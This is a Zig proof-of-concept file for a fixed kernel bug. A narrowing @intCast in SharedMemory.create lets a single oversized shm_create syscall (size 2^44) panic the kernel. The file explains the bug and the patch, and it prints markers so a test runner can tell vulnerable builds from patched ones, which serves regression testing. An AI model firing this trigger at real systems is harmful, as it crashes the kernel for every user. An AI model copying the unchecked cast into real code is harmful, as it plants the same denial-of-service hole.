// PoC for 02eba15: SharedMemory.create narrowing cast.
//
// Pre-patch: sysMemShmCreate validates only that size is non-zero and
// 4K-aligned. SharedMemory.create then computes
//   const num_pages: u32 = @intCast((size + PAGE4K - 1) / PAGE4K);
// For any 4K-aligned size >= 2^44, the divided result is >= 2^32 and
// the @intCast panics in safety-checked builds — a single-syscall
// ring-0 DoS reachable from any caller holding mem_shm_create. Even
// without the safety panic, the narrowed value would wrap and the
// kernel would build a SharedMemory whose `pages.len` mismatches the
// caller's view of `size`.
//
// Post-patch: an in-u64 bound check (`num_bytes > MAX_PAGES * PAGE4K`)
// short-circuits before the cast and SharedMemory.create returns
// error.TooManyPages, which sysMemShmCreate maps to E_NOMEM (-4).
//
// Differential: this PoC prints two lines around the syscall. Pre-patch
// the kernel panics inside the syscall and the second line never
// appears. Post-patch both lines appear and the syscall returns -4.
// The runner greps for the final POC-S5 line:
//
//   "POC-S5: VULNERABLE" — kernel returned without panicking but with
//                          a non-error handle (the impossible case if
//                          a future regression silently truncates).
//   "POC-S5: PATCHED"    — syscall returned E_NOMEM cleanly.
//   absent               — kernel panicked mid-syscall (also vulnerable;
//                          the BEFORE marker is the load-bearing tell).

const lib = @import("lib");
const syscall = lib.syscall;
const perms = lib.perms;

pub fn main(_: u64) void {
    // 16 TiB, 4K-aligned. (size + 4095) / 4096 = 2^32, which does not
    // fit in u32 — the pre-patch @intCast traps.
    const size: u64 = 1 << 44;
    const rights: u64 = (perms.SharedMemoryRights{ .read = true, .write = true }).bits();

    syscall.write("POC-S5: BEFORE shm_create(size=2^44)\n");
    const ret = syscall.shm_create_with_rights(size, rights);
    syscall.write("POC-S5: AFTER shm_create\n");

    if (ret == syscall.E_NOMEM) {
        syscall.write("POC-S5: PATCHED (shm_create oversize -> E_NOMEM)\n");
    } else if (ret >= 0) {
        syscall.write("POC-S5: VULNERABLE (shm_create oversize returned handle)\n");
    } else {
        syscall.write("POC-S5: UNEXPECTED\n");
    }
    syscall.shutdown();
}
